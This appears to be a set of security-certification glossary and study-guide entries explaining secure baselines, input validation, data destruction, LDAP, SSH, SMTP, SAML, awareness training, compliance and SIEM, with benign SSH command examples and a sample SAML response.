A secure baseline is a collection of standard configurations and settings for network devices, software, patching and updates, access controls, logging, monitoring, password policies, encryption, endpoint protection, and many others. Secure baselines improve information technology security, manageability, and operational efficiencies by establishing consistent and centralized rules and procedures regarding configuring and securing the environment.

The Center for Internet Security (CIS) Benchmarks are an important resource for secure configuration best practices. CIS is recognized globally for publishing and maintaining best practice guides for securing IT systems and data. CIS Benchmarks cover multiple domains, such as networks, operating systems, and applications, and are updated continuously in response to evolving risks. For example, there are benchmarks for compliance with IT frameworks and compliance programs, such as PCI DSS, NIST 800-53, SOX, and ISO 27000. There are also product-focused benchmarks, such as for Windows Desktop, Windows Server, macOS, Linux, Cisco, web browsers, web servers, database and email servers, and VMware ESXi. Security Technical Implementation Guides (STIGs) are a specific secure baseline developed by the Defense Information Systems Agency (DISA) for the US Department of Defense. Like CIS Benchmarks, STIGs define a standardized set of security configurations and controls specifically designed for the DoD's IT infrastructure.

Several tools and technologies are available to help manage, deploy, and measure compliance with established secure baselines. Configuration management tools, such as Puppet, Chef, Ansible, and Microsoft's Group Policy, allow organizations to automate the deployment of secure baseline configurations across various diverse systems. These tools help enforce consistency and detect and correct deviations from the established baseline. For monitoring compliance, Security Content Automation Protocol (SCAP) compliant tools, like OpenSCAP, can assess and verify the system's adherence to the baseline. Furthermore, the CIS provides the CIS-CAT Pro tool, designed to assess system configurations against CIS's secure baseline benchmarks. The SCAP Compliance Checker (SCC) is a tool maintained by the DISA used to measure compliance with STIG baselines.
Secure Coding Techniques - The security considerations for new programming technologies should be well understood and tested before deployment. One of the challenges of application development is that the pressure to release a solution often trumps any requirement to ensure that the application is secure. A legacy software design process might be heavily focused on highly visible elements, such as functionality, performance, and cost. Modern development practices use a security development lifecycle running in parallel or integrated with the focus on software functionality and usability. Examples include Microsoft's SDL and the OWASP Software Assurance Maturity Model and Security Knowledge Framework. OWASP also collates descriptions of specific vulnerabilities, exploits, and mitigation techniques, such as the OWASP Top 10.

Input Validation
Input validation (Any technique used to ensure that the data entered into a field or variable in an application is handled appropriately by that application) is an essential protection technique used in software and web development that addresses the issue of untrusted input. Untrusted input describes how an attacker can provide specially crafted data to an application to manipulate its behavior. Injection attacks exploit the input mechanisms applications rely on to execute malicious commands and scripts to access sensitive data, control the operation of the application, gain access to otherwise protected back-end systems, and disrupt operations.

Without effective input validation, applications are vulnerable to many different classes of injection attacks, such as SQL injection, code injection, cross-site scripting (XSS), and many others.

1. Allowlisting - This method only permits inputs that match a predetermined and approved set of values or patterns.

2. Blocklisting - This approach explicitly blocks known harmful inputs, such as certain special characters or patterns commonly used in attacks.

3. Data Type Checks - These checks ensure the input data is of the expected type, such as a string, integer, or date.

4. Range Checks - These validate that numeric inputs fall within expected ranges.

5. Regular Expressions - Also known as regex, these are used to match input to expected patterns or signs of malicious activity.

6. Encoding - This helps to safely and reliably prevent special characters in input from being interpreted as executable commands or scripts.

Secure Cookies
Cookies (A text file used to store information about a user when they visit a website. Some sites use cookies to support user sessions) are small pieces of data stored on a computer by a web browser while accessing a website. They maintain session states, remember user preferences, and track user behavior and other settings. Cookies can be exploited if not properly secured, leading to attacks such as session hijacking or cross-site scripting.

To implement secure cookies, developers must follow certain well-documented principles, such as using the 'Secure' attribute for all cookies to ensure they are only sent over HTTPS connections and protected from interception via eavesdropping, using the 'HttpOnly' attribute to prevent client-side scripts from accessing cookies and protect against cross-site scripting attacks, and using the 'SameSite' attribute to limit when cookies are sent to mitigate cross-site request forgery attacks. Additionally, cookies should have expiration time limits to restrict their usable life.

Secure cookie techniques are critical in mitigating several web-based application attacks, particularly those focused on unauthorized access or manipulation of session cookies. Developers can defend against attacks that target them by employing specific attributes within cookies.

Static Code Analysis
Static code analysis is a crucial software development practice. It involves scrutinizing source code to identify potential vulnerabilities, errors, and noncompliant coding practices before the program is finalized. By examining code in a 'static' state, developers can catch and rectify issues early in the development lifecycle, making it a proactive approach to building secure, reliable, and high-quality software.

Application security approaches focus on software development and deployment lifecycles, with a heavy emphasis on secure coding practices that encourage developers to write code that prevents common vulnerabilities like SQL injection and cross-site scripting. Application security practices also mandate static application security testing (SAST) and dynamic application security testing (DAST). Coding practices designed to support regular patching and updates are crucial to support the prompt resolution of newly discovered vulnerabilities.

Static code analysis supports secure coding and is performed using specialized tools, often integrated into software development suites. These tools automate code checks against pre-determined rules and flag potential issues so developers can review and address them. Some commonly used static analysis tools include SonarQube, Coverity, and Fortify.

Code signing (The method of using a digital signature to ensure the source and integrity of programming code) practices use digital signatures to verify the integrity and authenticity of software code. Code signing serves a dual purpose: ensuring that software has not been tampered with since signing and confirming the software publisher's identity.

When software is digitally signed, the signer uses a private key to encrypt a hash or digest of the code—this encrypted hash and the signer's identity form the digital signature. Code signing requires using a certificate issued by a trusted certificate authority (CA). The certificate contains information about the signer's identity and is critical for verifying the digital signature. If the certificate is valid and issued by a trusted CA, the software publisher's identity can be confidently verified. Code signing helps analysts and administrators block untrusted software and also helps protect software publishers by providing a mechanism to validate the authenticity of their code. Overall, code signing helps build trust in the software distribution process.

While code signing provides assurance about the origin of code and verifies code integrity, it does not inherently assure the safety or security of the code itself. Code signing certifies the source and integrity of the code, but it doesn't evaluate the quality or security of the code. The signed code could still contain bugs, vulnerabilities, or malicious code inserted by the original author. Signing ensures software is from the expected developer and in the state the developer intended. While code signing adds trust and authenticity to software distribution, it should not be relied upon to guarantee secure or bug-free code.
Secure Data Destruction - Several common circumstances may necessitate data destruction within an organization to ensure security, compliance, and proper management of resources. At the end of a data retention period, organizations must destroy data in accordance with internal policies and external regulations while optimizing storage resources. Legal and regulatory compliance, such as adhering to the General Data Protection Regulation (GDPR) or the Health Insurance Portability and Accountability Act (HIPAA), also requires the deletion or destruction of specific data when it is no longer needed or if requested by the data subject. Periodically destroying obsolete or outdated data can help maintain efficient storage utilization and reduce the risk of data breaches.

Additionally, when decommissioning storage devices or systems, ensure that any stored data is destroyed before disposal or repurposing to prevent unauthorized access to sensitive information. It is critical to use methods appropriate for the type of storage media being decommissioned:
 
For Hard Disk Drives (HDDs), data wiping methods such as overwriting with zeros or multiple patterns can be effective. This process can include a single pass of zeros or more complex patterns involving multiple passes to thwart attempts at data recovery.

For Solid-State Drives (SSDs), traditional overwriting methods are less effective due to wear leveling and bad block management. Instead, use commands such as the ATA Secure Erase, which are designed to handle the specific challenges of SSD technology by instructing the drive's firmware to internally sanitize all stored data, including that within inaccessible marked-as-bad memory cells.

Asset Disposal
Asset disposal/decommissioning (in asset management, the policies and procedures that govern the removal of devices and software from production networks, and their subsequent disposal through sale, donation, or as waste) concepts focus on the secure and compliant handling of data and storage devices at the end of their lifecycle or when they are no longer needed. Some important concepts include the following:

1. Sanitization - Refers to the process of removing sensitive information from storage media to prevent unauthorized access or data breaches. This process uses specialized techniques, such as data wiping, degaussing, or encryption, to ensure that the data becomes irretrievable. Sanitization is particularly important when repurposing or donating storage devices, as it helps protect the organization's sensitive information and maintains compliance with data protection regulations.

2. Destruction - Involves the physical or electronic elimination of information stored on media, rendering it inaccessible and irrecoverable. Physical destruction methods include shredding, crushing, or incinerating storage devices, while electronic destruction involves overwriting data multiple times or using degaussing techniques to eliminate magnetic fields on storage media. Destruction is a crucial step in the decommissioning process and ensures that sensitive data cannot be retrieved or misused after the disposal of storage devices.

3. Certification - Refers to the documentation and verification of the data sanitization or destruction process. This often involves obtaining a certificate of destruction or sanitization from a reputable third-party provider, attesting that the data has been securely removed or destroyed in accordance with industry standards and regulations. Certification helps organizations maintain compliance with data protection requirements, provides evidence of due diligence, and reduces the risk of legal liabilities. Certifying data destruction without third-party involvement can be challenging, as the latter provides an impartial evaluation.

Files deleted from a magnetic-type hard disk are not fully erased. Instead, the sectors containing the data are marked as available for writing, and the data they contain are only removed as new files are added. Similarly, the standard Windows format tool will only remove references to files and mark all sectors as usable. For this reason, the standard method of sanitizing an HDD is called overwriting. This can be performed using the drive's firmware tools or a utility program. The most basic type of overwriting is called zero filling, which sets each bit to zero. Single pass zero filling can leave patterns that can be read with specialist tools. A more secure method is to overwrite the content with one pass of all zeros, then a pass of all ones, and then a third pass in a pseudorandom pattern. In the past, some federal agencies required the “three pass rule” per the Department of Defense (DoD) manual, but have since moved to National Institute of Standards and Technologies (NIST) SP 800-88 for media sanitization guidelines/procedures. Overwriting can take considerable time, depending on the number of passes required.
Secure Directory Services - A network directory lists the subjects (principally users, computers, and services) and objects (such as directories and files) available on the network plus the permissions that subjects have over objects. A directory facilitates authentication and authorization, and it is critical that it be maintained as a highly secure service. Most directory services are based on the Lightweight Directory Access Protocol (LDAP), running over port 389. The basic protocol provides no security and all transmissions are in plaintext, making it vulnerable to sniffing and on-path attacks. Authentication (referred to as binding to the server) can be implemented in the following ways:

1. No Authentication - Means anonymous access is granted to the directory.

2. Simple Bind - Means the client must supply its distinguished name (DN) and password, but these are passed as plaintext.

3. Simple Authentication and Security Layer (SASL) - Means the client and server negotiate the use of a supported authentication mechanism, such as Kerberos. The STARTTLS command can be used to require encryption (sealing) and message integrity (signing). This is the preferred mechanism for Microsoft's Active Directory (AD) implementation of LDAP.

4. LDAP Secure (LDAPS - A method of implementing LDAP using SSL/TLS encryption) - Means the server is installed with a digital certificate, which it uses to set up a secure tunnel for the user credential exchange. LDAPS uses port 636.

If secure access is required, anonymous and simple authentication access methods should be disabled on the server.

Generally, two levels of access will need to be granted on the directory: read-only access (query) and read/write access (update). This is implemented using an access control policy, but the precise mechanism is vendor-specific and not specified by the LDAP standards documentation.

Unless hosting a public service, the LDAP directory server should only be accessible from the private network. This means that the LDAP port should be blocked by a firewall from access over the public interface. If there is integration with other services over the Internet, ideally only authorized IPs should be permitted.
Secure Enclave - CPU extensions that protect data stored in system memory so that an untrusted process cannot read it.

A trusted execution environment (TEE) secure enclave, such as Intel Software Guard Extensions, is able to protect data stored in system memory so that an untrusted process cannot read it. A secure enclave is designed so that even processes with root or system privileges cannot access it without authorization. The enclave is locked to a list of one or more digitally signed processes.
Secure File Transfer Protocol (SFTP) - A secure version of the File Transfer Protocol that uses a Secure Shell (SSH) tunnel as an encryption method to transfer, access, and manage files.

Secure File Transfer Protocol (SFTP) addresses privacy and integrity issues of FTP by encrypting the authentication and data transfer between client and server. In SFTP, a secure link is created between the client and server using Secure Shell (SSH) over TCP port 22. Ordinary FTP commands and data transfer can then be sent over the secure link without the risk of eavesdropping or on-path attacks. This solution requires an SSH server that supports SFTP and SFTP client software.
Secure Hash Algorithm (SHA) - A cryptographic hashing algorithm created to address possible weaknesses in MD5. The current version is SHA-2. Considered the strongest algorithm. There are variants that produce different-sized outputs, with longer digests considered more secure. The most popular variant is SHA256, which produces a 256-bit digest.
Secure IMAP (IMAPS) - Compared to POP3, the Internet Message Access Protocol (IMAP - Application protocol providing a means for a client to access and manage email messages stored in a mailbox on a remote server. IMAP4 utilizes TCP port number 143, while the secure version IMAPS uses TCP/993) supports permanent connections to a server and connects multiple clients to the same mailbox simultaneously. It also allows a client to manage mail folders on the server. Clients connect to IMAP over TCP port 143. They authenticate themselves , then retrieve messages from the designated folders. Like other email protocols, the connection can be secured by establishing an SSL/TLS tunnel. The default port for IMAPS is TCP port 993.
Secure POP (POP3S) - The Post Office Protocol v3 (POP3 - Application protocol that enables a client to download email messages from a server mailbox to a client over port TCP/110 or secure port TCP/995) is a mailbox protocol designed to store the messages delivered by SMTP on a server. When the client connects to the mailbox, POP3 downloads the messages to the recipient's email client.

A POP3 client application, such as Microsoft Outlook or Mozilla Thunderbird, establishes a TCP connection to the POP3 server over port 110. The user is authenticated (by username and password), and the contents of their mailbox are downloaded for processing on the local PC. POP3S is the secured version of the protocol operating over TCP port 995 by default.
Secure Protocols - Many of the protocols used on computer networks today were developed many decades ago when functionality was paramount, trustworthiness was assumed instead of earned, and network security was less of an issue than it is today. Many early-era protocols have secure alternatives or can be configured to incorporate security features, whereas others must simply be avoided.

Insecure protocols, such as HTTP and Telnet, transmit data in clear text format, meaning anyone accessing the data packets can read any intercepted data sent over a network. In contrast, secure protocols, like HTTPS and SSH (as alternatives to HTTP and TELNET), use encryption to protect transmitted data and improve security.

Using HTTPS is crucial for protecting sensitive user information, such as login credentials and data entered into form fields, from being stolen when using webpages. System and network engineers must use SSH instead of Telnet when connecting to servers and equipment to ensure their login information, data, and commands are encrypted.

Unfortunately, secure protocols are typically more complex to implement, manage, and maintain when compared to their insecure counterparts and so are often avoided or disabled. For example, HTTPS requires obtaining a valid SSL/TLS certificate from a certificate authority (CA). After obtaining the appropriate certificate, it must be correctly installed and configured on a server, which requires more skill, time, and planning than simply enabling and using HTTP.

Secure protocols leverage encryption and decryption which require the correct handling of cryptographic keys, including processes regarding how they are created, stored, distributed, and revoked. Additionally, after properly obtaining and configuring the certificate, it must be managed effectively to ensure it remains trustworthy and does not expire.

Troubleshooting issues with secure protocols is more challenging compared to insecure counterparts because administrators cannot easily inspect the content of data packets when troubleshooting issues, and the configuration of secure software and operating systems is more complicated and prone to misconfiguration compared to simple configurations that use insecure protocols.

Despite these complexities, the security benefits provided by secure protocols significantly outweigh the challenges. All protocols should be secure unless specific justifications warrant using insecure ones.

Implementing Secure Protocols
Organizations usually follow formal processes when selecting secure protocols to ensure comprehensive documentation and well-informed decision-making. These processes include assessing risks, reviewing policies, and evaluating the security features of different protocols. Organizations may also consult with technical experts or vendors for recommendations. The outcomes of these processes are documented, which is useful for audits and compliance reviews. Additionally, these process outcomes will typically impact security baselines and configuration management systems.

Selecting protocols, assigning ports, setting transport methods, and other security considerations require careful consideration. The first step requires evaluating the data type used and its sensitivity level. Organizations should select secure protocols like HTTPS, SSH, and SFTP/FTPS for transmitting sensitive or private data. Configuring TCP ports depends on the protocol, as standard ports are associated with specific protocols (HTTP commonly uses port 80, HTTPS uses port 443). While default protocol ports can be changed, doing so may complicate configuration and cause potential accessibility issues.

However, many administrators choose to change standard default ports and a method to obscure them. TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) are two principal transport methods. TCP is connection-oriented and provides reliability, ordering, and error-checking, making it suitable for applications requiring high levels of reliability. UDP is connectionless, making it faster than TCP and more suitable for real-time applications like video streaming, telephony, and gaming, where occasional packet loss is less impactful.

When selecting secure protocols, administrators and analysts must consider suitable encryption levels, authentication methods, existing firewalls or other security equipment, and other factors which may impact the operation of the systems and software they are intended to protect. Ultimately, protocol selection requires an optimum balance among security, maintainability, performance, and cost.
Secure Shell (SSH) - Application protocol supporting secure tunneling and remote terminal emulation and file copy. SSH runs over TCP port 22.

Secure Shell (SSH) is the principal means of obtaining secure remote access to a command line terminal. The main uses of SSH are for remote administration and secure file transfer (SFTP). Numerous commercial and open-source SSH products are available for all the major NOS platforms. The most widely used is OpenSSH.

SSH servers are identified by a public/private key pair that is referred to as the host key. Host names can be mapped to host keys manually by each SSH client, or through various enterprise software products designed for SSH host key management.

The host key must be changed if any compromise of the host is suspected. If an attacker has obtained the private key of a server or appliance, they can masquerade as that server or appliance and perform a spoofing attack, usually with a view to obtaining other network credentials.

The server's host key is used to set up a secure channel to use for the client to submit authentication credentials.

SSH Client Authentication
SSH allows various methods for the client to authenticate to the server. Each of these methods can be enabled or disabled as required on the server, using the /etc/ssh/sshd_config file:

1. Username/password - Is when the client submits credentials that are verified by the SSH server either against a local user database or using a RADIUS server.

2. Public key authentication - Is when each remote user's public key is added to a list of keys authorized for each local account on the SSH server.

3. Kerberos - Is when the client submits the Kerberos credentials (a Ticket Granting Ticket) obtained when the user logs onto the workstation to the server using the Generic Security Services Application Program Interface (GSSAPI). The SSH server contacts the Ticket Granting Service (in a Windows environment, this will be a domain controller) to validate the credentials.

Managing valid client public keys is a critical security task. Many recent attacks on web servers have exploited poor key management. If a user's private key is compromised, delete the public key from the appliance and then regenerate the key pair on the user's (remediated) client device and copy the public key to the SSH server. Always delete public keys when the user's access permissions have been revoked.

SSH Commands
SSH commands are used to connect to hosts and set up authentication methods. To connect to an SSH server at 10.1.0.10 using an account named "bobby" and password authentication, run:

ssh bobby@10.1.0.10

The following commands create a new key pair and copy it to an account on the remote server:

ssh-keygen -t rsa

ssh-copy-id bobby@10.1.0.10

At an SSH prompt, you can now use the standard Linux shell commands. Use exit to close the connection.

You can use the scp command to copy a file from the remote server to the local host:

scp bobby@10.1.0.10:/logs/audit.log audit.log

Reverse the arguments to copy a file from the local host to the remote server. To copy the contents of a directory and any subdirectories (recursively), use the -r option.
Secure SMTP (SMTPS) - To deliver a message, the SMTP server of the sender discovers the IP address of the recipient SMTP server using the domain name part of the email address. The SMTP server for the domain is registered in DNS using a mail exchanger (MX) record.

SMTP communications can be secured using TLS. This works much like HTTPS with a certificate on the SMTP server. There are two ways for SMTP to use TLS:

1. STARTTLS - It is a command that upgrades an existing unsecure connection to use TLS. This is also referred to as explicit TLS or opportunistic TLS.

2. SMTPS - It establishes the secure connection before any SMTP commands (HELO, for instance) are exchanged. This is also referred to as implicit TLS.

The STARTTLS method is generally more widely implemented than SMTPS. Typical SMTP configurations use the following ports and secure services:

1. Port 25 - It is used for message relay (between SMTP servers or message transfer agents [MTA]). If security is required and supported by both servers, the STARTTLS command can be used to set up the secure connection.

2. Port 587 - It is used by mail clients ( message submission agents [MSA]) to submit messages for delivery by an SMTP server. Servers configured to support port 587 should use STARTTLS and require authentication before message submission.

3. Port 465 - It is used by some providers and mail clients for message submission over implicit TLS (SMTPS), though this usage is now deprecated by standards documentation.
Secure/Multipurpose Internet Mail Extensions (S/MIME) - Secure/Multipurpose Internet Mail Extensions (S/MIME) is a protocol for securing email communications. It encrypts emails and enables sender authentication to ensure the confidentiality and integrity of email communications. S/MIME uses public key encryption techniques to secure email content (the "body" of email). S/MIME also incorporates digital signatures to support sender verification and ensure messages are unmodified. By providing encryption and authentication capabilities, S/MIME significantly enhances the security of email communication, but its implementation is often complicated and prone to misconfiguration.
Security Assertion Markup Language (SAML) - An XML-based data format used to exchange authentication information between a client and a service.

A federated network or cloud needs specific protocols and technologies to implement user identity assertions and transmit claims between the principal, the relying party, and the identity provider. Security Assertion Markup Language (SAML) is one such solution. SAML assertions (claims) are written in eXtensible Markup Language (XML). Communications are established using HTTP/HTTPS and the Simple Object Access Protocol (SOAP). The secure tokens are signed using the XML signature specification. The use of a digital signature allows the relying party to trust the identity provider.

An example of a SAML implementation is Amazon Web Services (AWS) which functions as a SAML service provider. This allows companies using AWS to develop cloud applications to manage their customers' user identities and provide them with permissions on AWS without having to create accounts for them on AWS directly.

<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"

xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="200" Version="2.0"

IssueInstant="2020-01-01T20:00:10Z " Destination="https://sp.foo/saml/acs" InResponseTo="100".

<saml:Issuer>https://idp.foo/sso</saml:Issuer>

<ds:Signature>...</ds:Signature>

<samlp:Status>...(success)...</samlp:Status>

<saml:Assertion xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"

xmlns:xs="http://www.w3.org/2001/XMLSchema" ID="2000" Version="2.0"

IssueInstant="2020-01-01T20:00:09Z">

<saml:Issuer>https://idp.foo/sso</saml:Issuer>

<ds:Signature>...</ds:Signature>

<saml:Subject>...

<saml:Conditions>...

<saml:AudienceRestriction>...

<saml:AuthnStatement>...

<saml:AttributeStatement>

<saml:Attribute>...

<saml:Attribute>...

</saml:AttributeStatement>

</saml:Assertion>

</samlp:Response>
Security Awareness Training Lifecycle - Security awareness training practices typically follow a lifecycle approach consisting of several stages.

The phases are as follows: assessment, planning and design, development, delivery and implementation, evaluation and feedback, ongoing reinforcement, and monitoring and adaptation.

The first phase is assessing the organization's security needs and risks. Planning and designing awareness training activities follow, where a comprehensive plan is developed, including objectives, topics, and delivery methods. Once a plan is created, the development stage focuses on creating engaging and informative training materials. Training is then delivered through previously identified delivery methods, such as in-person or computer-based sessions. Evaluation and feedback activities assess the training's effectiveness and gather participant insights. Security awareness is reinforced via recurring training activities to ensure it remains a priority and often includes refresher training, reminders, newsletters, and awareness campaigns. Monitoring and adaptation allow organizations to continually evaluate the program's impact and make necessary adjustments based on emerging risks and changing requirements. Organizations can establish a continuous and effective security awareness training program by following this lifecycle. It helps enhance employee knowledge, steer behaviors, and cultivate a security culture within the organization. Regular assessment, evaluation, and adaptation ensure that training remains relevant and addresses evolving security threats. A well-structured security awareness training program significantly contributes to mitigating risks, protecting sensitive data, and building a resilient cybersecurity posture.

Development and Execution of Training
Successfully executing security training means effectively providing education and instruction to employees and staff that enhance their knowledge, skills, and awareness of security practices. It involves delivering training programs addressing relevant security topics, like data protection, incident response, phishing awareness, secure coding practices, physical security, and many others. Content development focuses on creating engaging and informative training materials, using clear language, and incorporating real-world examples to enhance relevance and mix interactive elements like quizzes, case studies, or simulations to encourage active participation, critical thinking, and practical application of knowledge. Facilitating dialogue, discussion, and question-and-answer sessions further enhance the learning experience. To assess the effectiveness of security awareness practices, collecting feedback, conducting assessments, and developing relevant measurements and metrics help gauge the impact of the training and identify areas for improvement. Regular reviews and updates to training materials ensure that its content remains relevant and aligned with evolving security threats. Incorporating emerging best practices and industry trends help organizations stay current and enhance their security awareness practices.

Reporting and Monitoring
One way to gauge the efficacy of security awareness training is to assess its influence initially and through ongoing evaluations.

Initial effectiveness refers to the immediate impact of security awareness training on participants. It measures the knowledge gained, awareness raised, and behavioral changes observed immediately after completing a training program. Evaluation methods can include pre- and post-training assessments, quizzes, and surveys designed to gauge participant understanding of security concepts before and after training. Measuring initial effectiveness provides insight into the immediate impact of training and how participants have absorbed the information and concepts presented.

Recurring effectiveness assesses the long-term impact and sustainability of security awareness training by examining whether participants have retained and applied the knowledge and skills gained from training in their day-to-day activities. The focus is to measure the continued behavioral changes and the level of security consciousness within the organization over an extended period.

Initial and recurring effectiveness measurements are crucial to gauge the overall impact of security awareness training. While measuring initial effectiveness shows the immediate outcomes and knowledge uptake, recurring effectiveness measurements ensure that the training has a lasting effect and leads to sustained improvements in security practices.

1. Assessments and Quizzes - Conducting pre - and post-training assessments and quizzes allow organizations to measure the knowledge gained by employees during training. These reports provide quantitative data regarding training effectiveness related to knowledge retention and comprehension.

2. Incident Reporting - Organizations can track and analyze incident reports to assess the training program's impact on incident detection and response, identifying any patterns or trends.

3. Phishing Simulations - Conducting simulated phishing campaigns helps organizations evaluate employees' ability to recognize and respond to phishing attempts. Reports generated from these simulations provide data on click rates, successful phish captures, and trends in susceptibility, indicating the effectiveness of the training in mitigating phishing risks.

4. Observations and Feedback - Managers and supervisors can provide feedback on employees' security practices and behaviors. Qualitative information such as this provides valuable insights into the practical application of training and any challenges employees face in implementing the knowledge gained.

5. Metrics and Performance Indicators - Tracking relevant metrics, such as the number of reported incidents, employee compliance with security policies, or changes in password hygiene, provides quantitative data on the impact of security awareness training. These metrics help measure the effectiveness of the training program over time.

6. Training Completion Rates - Monitoring the completion rates of security awareness training modules or sessions indicates employee engagement and adherence to training requirements. Higher completion rates suggest better participation and performance of the training content.
Security Compliance - Security compliance refers to organizations' adherence to applicable security standards, regulations, and best practices to protect sensitive information, mitigate risks, and ensure data confidentiality, integrity, and availability. Effective compliance necessitates establishing and implementing policies, procedures, controls, and technical measures to meet the requirements set forth by regulatory bodies, industry standards, and legal obligations.

Impacts of Noncompliance
Noncompliance with data protection laws and regulations can have severe consequences for organizations. The consequences vary depending on jurisdiction and the specific regulations violated. Common ramifications for noncompliance include legal sanctions such as financial penalties, legal liabilities, reputational damage, and loss of customer trust. Sanctions refer to penalties, disciplinary actions, or measures imposed due to noncompliance with laws, regulations, or rules. Sanctions are enforced by governing bodies, regulatory authorities, or organizations overseeing the specific domain in which the noncompliance occurred. Regulatory agencies may impose substantial fines, which can amount to millions or even billions of dollars, depending on the severity of the violation. Legal action from affected individuals or data subjects may lead to costly lawsuits and settlements. Noncompliance can harm an organization's reputation, eroding customer trust, decreasing business opportunities, and potentially losing contracts or partnerships. Organizations may also face additional regulatory scrutiny, including increased audits, investigations, or mandated remediation measures. Organizations must prioritize data protection compliance, implement appropriate security measures, conduct regular risk assessments, and stay informed about evolving data protection laws and regulations to avoid these consequences.

Due diligence in the context of data protection describes the comprehensive assessment and evaluation of an organization's data protection practices and measures. It involves examining and verifying the adequacy of data security controls, privacy policies, data handling procedures, and compliance with applicable laws and regulations.

Software Licensing
Noncompliance with software licensing requirements can result in the revocation of usage rights and other consequences such as fines. Violations of license agreements, such as exceeding permitted installations, unauthorized sharing, or other unauthorized usage, constitute contractual noncompliance. Other forms of noncompliance include breaching license terms, such as modifying code or distributing software without authorization. In response, software vendors or licensing authorities may revoke or suspend licenses and take other legal actions. The loss of software licenses can disrupt business operations, causing inefficiencies and workflow interruptions as well as cause significant reputational damage. To ensure compliance, organizations can rectify noncompliance through license remediation, proper license management, and audits.

Impacts of Contractual Noncompliance

1. Breach of Contract - Noncompliance can result in a breach of contract. Contracts between parties often include provisions related to data protection, cybersecurity measures, and the safeguarding of sensitive information. Failure to meet these contractual obligations can lead to legal consequences, including potential liability for damages or loss resulting from noncompliance.

2. Termination of Contracts - Noncompliance may give the compliant party grounds for contract termination. Contractual agreements may contain clauses allowing termination if the other party fails to protect data or implement sufficient cybersecurity measures adequately. The noncompliant party may face termination penalties, loss of business relationships, and the need to seek new contractual arrangements, which will be complicated by poor past performance.

3. Indemnification and Liability - Noncompliance may result in the noncompliant party assuming liability for damages caused by a security breach or data loss. Contractual agreements may include indemnification clauses, shifting responsibility for losses, or legal expenses resulting from cybersecurity incidents onto the noncompliant party leading to financial burdens and reputational damage.

4. Noncompliance Penalties - Contracts may stipulate penalties or financial consequences for noncompliance with cybersecurity requirements, such as monetary fines or contractual damages that the noncompliant party must pay to the aggrieved party. Noncompliance penalties aim to incentivize adherence to cybersecurity measures outlined in the contractual agreement.
Security Content Automation Protocol (SCAP) - A NIST framework that outlines various accepted practices for automating vulnerability scanning.
Security Control - A technology or procedure put in place to mitigate vulnerabilities and risk and to ensure the confidentiality, integrity, and availability (CIA) of information. A security control is designed to give a system or data asset the properties of confidentiality, integrity, availability, and non-repudiation. They can be divided into four broad categories based on the way the control is implemented: Managerial, Operational, Technical, and Physical.
Security Guards and Cameras - Surveillance is typically a second layer of security designed to improve the resilience of perimeter gateways. Surveillance may be focused on perimeter areas or within security zones. Human security guards, armed or unarmed, can be placed in front of and around a location to protect it. They can monitor critical checkpoints and verify identification, allow or disallow access, and log physical entry events. They also provide a visual deterrent and can apply their knowledge and intuition to potential security breaches. The visible presence of guards is a very effective intrusion detection and deterrence mechanism, but it is correspondingly expensive. It may not be possible to place security guards within certain zones because they cannot be granted the appropriate security clearance. Training and screening of security guards is imperative.

Video surveillance (Physical security control that uses cameras and recording devices to visually monitor the activity in a certain area) is a cheaper means of providing surveillance than maintaining separate guards at each gateway or zone, though it is still not cheap to set up if the infrastructure is not already in place on the premises. It is also quite an effective deterrent. The other big advantage is that movement and access can be recorded. The main drawback compared to the presence of security guards is that response times are longer, and security may be compromised if not enough staff are in place to monitor the camera feeds.

The cameras in a CCTV network are typically connected to a multiplexer using coaxial cabling. The multiplexer can then display images from the cameras on one or more screens, allow the operator to control camera functions and record the images to tape or hard drive. Newer camera systems may be linked in an IP network using regular data cabling.

Camera systems and robotics can use AI and machine learning to implement smart physical security:

1. Motion Recognition - Occurs when the camera system is configured with gait identification technology. This means the system can generate an alert when anyone within sight of the camera moves in a pattern that does not match a known and authorized individual.

2. Object Detection - Occurs when the camera system can detect changes to the environment, such as a missing server or unknown device connected to a wall port.

3. Drones/UAV - Cameras mounted on drones can cover wider areas than ground-based patrols.
Security Identifier (SID) - The value assigned to an account by Windows and that is used by the operating system to identify that account.
Security Information and Event Management (SIEM) - A solution that provides real-time or near-real-time analysis of security alerts generated by network hardware and applications.

Software designed to assist with managing security data inputs and provide reporting and alerting is often described as security information and event management (SIEM). The core function of a SIEM tool is to collect and correlate data from network sensors and appliance/host/application logs. In addition to logs from Windows and Linux-based hosts, this could include switches, routers, firewalls, IDS sensors, packet sniffers, vulnerability scanners, malware scanners, and data loss prevention (DLP) systems.

Agent-Based and Agentless Collection
Collection is the means by which the SIEM ingests security event data from various sources. There are three main types of security data collection:

1. Agent-based - This approach means installing an agent service on each host. As events occur on the host, logging data is filtered, aggregated, and normalized at the host, then sent to the SIEM server for analysis and storage. Collection from Windows/Linux/macOS computers will tend to use agent-based collection. The agent must run as a process and could use from 50–500 MB of RAM, depending on the amount of activity and processing it does.

2. Listener/collector - Rather than installing an agent, hosts can be configured to push log changes to the SIEM server. A process runs on the management server to parse and normalize each log/monitoring source. This method is often used to collect logs from switches, routers, and firewalls, as these are unlikely to support agents. Some variant of the Syslog protocol is typically used to forward logs from the appliance to the SIEM.

3. Sensor - As well as log data, the SIEM might collect packet captures and traffic flow data from sniffers. A sniffer can record network data using either the mirror port functionality of a switch or using some type of tap on the network media.

Log Aggregation
As distinct from collection, log aggregation (Parsing information from multiple log and security event data sources so that it can be presented in a consistent and searchable format) refers to normalizing data from different sources so that it is consistent and searchable. SIEM software features connectors or plug-ins to interpret (or parse) data from distinct types of systems and to account for differences between vendor implementations. Each agent, collector, or sensor data source will require its own parser to identify attributes and content that can be mapped to standard fields in the SIEM's reporting and analysis tools. Another important function is to normalize date/time zone differences to a single timeline.
Security Logs - A target for event data related to access control, such as user authentication and privilege use.
Security Operations Center (SOC) - The location where security professionals monitor and protect critical information assets in an organization. A security operations center (SOC) is a location where security professionals monitor and protect critical information assets across other business functions, such as finance, operations, sales/marketing, and so on. Because SOCs can be difficult to establish, maintain, and finance, they are usually employed by larger corporations, like a government agency or a healthcare company. A security operations center (SOC) provides resources and personnel to implement rapid incident detection and response, plus oversight of cybersecurity operations.
Self-encrypting Drives (SED) - A disk drive where the controller can automatically encrypt data that is written to it.
Self-signed Certificate - A digital certificate that has been signed by the entity that issued it, rather than by a CA.

